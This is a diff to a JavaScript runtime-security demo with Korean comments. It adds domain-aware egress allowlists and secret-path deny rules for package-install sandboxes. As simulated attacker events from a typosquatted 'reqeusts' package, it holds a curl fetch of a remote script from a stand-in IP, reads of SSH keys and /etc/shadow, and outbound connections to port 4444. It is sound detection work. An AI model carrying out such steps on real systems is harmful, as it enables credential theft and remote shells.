@@ -23,7 +23,7 @@
       { kind: 'open', comm: 'node', path: '/app/node_modules/express/index.js' },
       { kind: 'open', comm: 'node', path: '/etc/hosts' },
       { kind: 'connect', comm: 'node', dstIp: '172.18.0.4', dstPort: 5432 },
-      { kind: 'connect', comm: 'node', dstIp: '104.16.2.35', dstPort: 443 },
+      { kind: 'connect', comm: 'node', dstIp: '104.16.2.35', dstPort: 443, dstHost: 'api.github.com' },
     ] },
     { name: 'worker', image: 'python:3.12-slim', attacker: false, normal: [
       { kind: 'exec', comm: 'python3', args: 'python3 -m worker' },
@@ -34,7 +34,7 @@
     { name: 'pkg-reqeusts', image: 'demo/reqeusts:1.0.2', attacker: true, normal: [
       { kind: 'exec', comm: 'python3', args: 'python3 -c import reqeusts' },
       { kind: 'open', comm: 'python3', path: '/usr/local/lib/python3.12/site-packages/reqeusts/__init__.py' },
-      { kind: 'connect', comm: 'python3', dstIp: '151.101.0.223', dstPort: 443 },
+      { kind: 'connect', comm: 'python3', dstIp: '151.101.0.223', dstPort: 443, dstHost: 'files.pythonhosted.org' },
     ] },
   ];
 
@@ -44,8 +44,8 @@
     { kind: 'exec', comm: 'curl', args: 'curl -s http://203.0.113.7/p.sh' },
     { kind: 'open', comm: 'python3', path: '/root/.ssh/id_rsa' },
     { kind: 'open', comm: 'python3', path: '/etc/shadow' },
-    { kind: 'connect', comm: 'python3', dstIp: '203.0.113.7', dstPort: 8081 },
-    { kind: 'connect', comm: 'sh', dstIp: '203.0.113.7', dstPort: 4444 },
+    { kind: 'connect', comm: 'python3', dstIp: '203.0.113.7', dstPort: 8081, dstHost: 'cdn.reqeusts-update.test' },
+    { kind: 'connect', comm: 'sh', dstIp: '203.0.113.7', dstPort: 4444, dstHost: 'cdn.reqeusts-update.test' },
   ];
 
   // ── 기본 정책 (backend/policies/default.yaml)
@@ -60,6 +60,11 @@
       denyPorts: [4444, 1337, 31337] },
     { id: 'egress-allowlist', description: '내부망이 아니면서 허용 포트(HTTP·HTTPS·DNS)도 아닌 아웃바운드 연결 (데모 시나리오 3)', kind: 'connect', action: 'alert',
       allowPorts: [80, 443, 53], allowCidrs: ['10.0.0.0/8', '172.16.0.0/12', '192.168.0.0/16', '127.0.0.0/8', '::1'] },
+    { id: 'sandbox-egress', description: '설치 샌드박스는 패키지 레지스트리·GitHub 외 아웃바운드를 금지 (도메인은 DNS 응답으로 확인)', kind: 'connect', action: 'kill', containers: ['sg-install-*'],
+      allowHosts: ['pypi.org', 'pythonhosted.org', 'registry.npmjs.org', 'registry.yarnpkg.com', 'crates.io', 'github.com', 'githubusercontent.com', 'deb.debian.org', 'dl-cdn.alpinelinux.org'],
+      allowCidrs: ['10.0.0.0/8', '172.16.0.0/12', '192.168.0.0/16', '127.0.0.0/8'] },
+    { id: 'sandbox-secrets', description: '설치 스크립트가 자격 증명·토큰·설정 파일에 손대면 격리', kind: 'open', action: 'kill', containers: ['sg-install-*'],
+      denyPaths: ['/root/.ssh/', '/root/.aws/', '/root/.npmrc', '/root/.pypirc', '/root/.netrc', '/root/.gitconfig', '/root/.docker/', '/run/secrets/'] },
   ];
 
   // ── 규칙 평가 (backend/internal/rules/engine.go 의 축약판: 가장 강한 대응 우선, allow 먼저)
@@ -97,14 +102,18 @@
         return d ? `금지 경로 ${d} 접근` : null;
       }
       case 'connect': {
-        const ip = e.dstIp || '', port = e.dstPort;
+        const ip = e.dstIp || '', port = e.dstPort, host = (e.dstHost || '').toLowerCase().replace(/\.$/, '');
+        const hostMatch = (pat) => { pat = pat.toLowerCase().replace(/\.$/, ''); return host && (host === pat || host.endsWith('.' + pat)); };
         if ((r.denyPorts || []).includes(port)) return `금지 포트 ${port}`;
         const dc = (r.denyCidrs || []).find((c) => inCidr(ip, c));
         if (dc) return `금지 대역 ${dc}`;
-        const hasAllow = (r.allowPorts || []).length || (r.allowCidrs || []).length;
+        const dh = (r.denyHosts || []).find(hostMatch);
+        if (dh) return `금지 도메인 ${dh}`;
+        const hasAllow = (r.allowPorts || []).length || (r.allowCidrs || []).length || (r.allowHosts || []).length;
         if (!hasAllow) return null;
-        if ((r.allowPorts || []).includes(port) || (r.allowCidrs || []).some((c) => inCidr(ip, c))) return null;
-        return `허용 목록 밖 목적지 ${ip}:${port}`;
+        if ((r.allowPorts || []).includes(port) || (r.allowCidrs || []).some((c) => inCidr(ip, c)) || (r.allowHosts || []).some(hostMatch)) return null;
+        const dst = host ? `${ip}:${port} (${host})` : `${ip}:${port}`;
+        return (r.allowHosts || []).length && !host ? `허용 목록 밖 목적지 ${dst} — 도메인 미확인` : `허용 목록 밖 목적지 ${dst}`;
       }
     }
     return null;
